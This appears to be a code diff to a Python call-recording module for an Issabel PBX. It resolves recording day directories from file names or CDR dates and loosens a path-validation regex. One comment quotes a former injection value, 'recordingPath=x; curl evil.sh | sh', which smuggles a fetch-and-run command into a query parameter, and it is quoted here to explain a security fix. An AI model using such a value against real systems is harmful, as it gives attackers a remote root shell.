@@ -1,7 +1,9 @@
 # Importing module
+import datetime as _dt
 import logging
 import os
 import re
+from zoneinfo import ZoneInfo
 
 import mysql.connector
 import paramiko
@@ -14,7 +16,33 @@ log = logging.getLogger("cawp.issable")
 # resolve under RECORDINGS_ROOT. The previous code interpolated the value straight from
 # the query string into `ssh.exec_command(f"cat {path}")` **as root**, so
 # `?recordingPath=x; curl evil.sh | sh` was a remote shell on the telephony box (review S1).
-_SAFE_REMOTE_PATH = re.compile(r"[A-Za-z0-9_./-]+")
+# `+` is allowed (a number in E.164 inside a name, e.g. out-+9665...-...wav): the file is read
+# over SFTP/HTTP or from a local directory, never through a shell.
+_SAFE_REMOTE_PATH = re.compile(r"[A-Za-z0-9_.+/-]+")
+
+# Bare recording names (no YYYY/MM/DD/ directory) -> the PBX day directory they are in:
+#   out-<dst>-<ext>-YYYYMMDD-HHMMSS-<uniqueid>.wav, exten-..., q-..., rg-...  the YYYYMMDD part
+#   in-ivr-<epoch>.<seq>.wav (the IVR's MixMonitor)                         the uniqueid epoch, Asia/Riyadh
+#   cawp-<attempt>.wav (click-to-call) or anything else                      the CDR calldate, when given
+# The PBX writes the directory in Asia/Riyadh wall-clock time (STRFTIME(...,Asia/Riyadh) and the
+# Issabel default), like the CDR calldate.
+_DAY_TOKEN = re.compile(r"^(20[0-9]{2})(0[1-9]|1[0-2])(0[1-9]|[12][0-9]|3[01])$")
+_EPOCH_NAME = re.compile(r"-(1[0-9]{9})\.[0-9]+\.[A-Za-z0-9]+$")
+_RIYADH = ZoneInfo("Asia/Riyadh")
+
+
+def _day_dir(file_name, calldate=None):
+    """'YYYY/MM/DD' for a bare recording name, or None."""
+    tokens = file_name.split('-')
+    for tok in tokens[3:4] + tokens:                         # the legacy position (4th part) first
+        if _DAY_TOKEN.match(tok):
+            return f"{tok[:4]}/{tok[4:6]}/{tok[6:8]}"
+    m = _EPOCH_NAME.search(file_name)
+    if m:
+        return _dt.datetime.fromtimestamp(int(m.group(1)), _RIYADH).strftime("%Y/%m/%d")
+    if isinstance(calldate, (_dt.date, _dt.datetime)):
+        return calldate.strftime("%Y/%m/%d")
+    return None
 
 
 class Issable_db():
@@ -248,15 +276,18 @@ class Issable_db():
         """.format(mobile_filter=mobile_filter)
         return self._query(sql, (start_date, end_date, *mobile_params))
 
-    def genrate_call_path(self, file_name):
+    def genrate_call_path(self, file_name, calldate=None):
         """
         Generate the remote file path for a call recording based on the file name.
 
         Args:
             file_name (str): The name of the call recording file or full path.
+            calldate (date|datetime, optional): the CDR calldate of the record naming the file,
+                used when the name itself carries no day (e.g. `cawp-<attempt>.wav`).
 
         Returns:
-            str: The full remote path to the call recording.
+            str: The full remote path to the call recording (the name unchanged when no day
+            can be found; _validate_remote_path then refuses it).
         """
         root = Config.RECORDINGS_ROOT
         if not root.endswith("/"):
@@ -272,15 +303,15 @@ class Issable_db():
                 and file_name[7:8] == '/' and file_name[8:10].isdigit() and file_name[10:11] == '/'):
             return f"{root}{file_name}"
 
-        # If it's just a filename, construct the full path
-        # Assuming the file name is in the format 'out-300531251001-420-20250726-131150-1753524710.290454.wav'
-        try:
-            date_part = file_name.split('-')[3]
-            return f"{root}{date_part[:4]}/{date_part[4:6]}/{date_part[6:8]}/{file_name}"
-        except IndexError:
-            # If the filename doesn't follow the expected format, return as is
-            log.warning("Unexpected recording filename format: %s", file_name)
-            return file_name
+        # A bare name: 'out-300531251001-420-20250726-131150-1753524710.290454.wav' (the day is the
+        # 4th part), 'in-ivr-1792072292.176850.wav' (the uniqueid epoch), 'cawp-<attempt>.wav' (the
+        # CDR calldate). See _day_dir.
+        if "/" not in file_name:
+            day = _day_dir(file_name, calldate)
+            if day:
+                return f"{root}{day}/{file_name}"
+        log.warning("Unexpected recording filename format: %s", file_name)
+        return file_name
 
     @staticmethod
     def _validate_remote_path(remote_file_path):
